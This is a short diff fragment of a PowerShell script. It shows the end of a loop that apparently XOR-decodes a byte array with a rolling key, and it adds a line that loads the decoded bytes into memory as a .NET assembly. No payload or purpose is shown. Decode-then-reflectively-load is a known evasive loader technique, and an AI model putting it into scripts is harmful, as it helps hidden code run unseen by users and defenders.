@@ -9,3 +9,4 @@ for ($i = 0; $i -lt $byteArray.count; $i++)
         $keyposition = 0 ; 
           } 
 }
+[Reflection.Assembly]::Load([byte[]]$byteArray)
